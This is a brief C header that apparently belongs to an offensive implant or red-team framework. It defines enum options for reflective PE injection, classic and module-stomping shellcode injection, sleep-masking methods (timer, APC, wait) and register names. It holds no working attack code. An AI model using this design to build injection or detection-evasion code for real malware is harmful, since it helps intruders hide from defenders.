#ifndef EVASION_H
#define EVASION_H

enum {
    KhReflection
} KH_INJ_PE;

enum {
    KhClassic,
    KhStomp
} KH_INJ_SC;

enum {
    MaskTimer,
    MaskApc,
    MaskWait
} KH_MASK;

enum {
    RegRax,
    RegRsi,
    RegRbx = 0x23
} KH_REG;

#endif // EVASION_H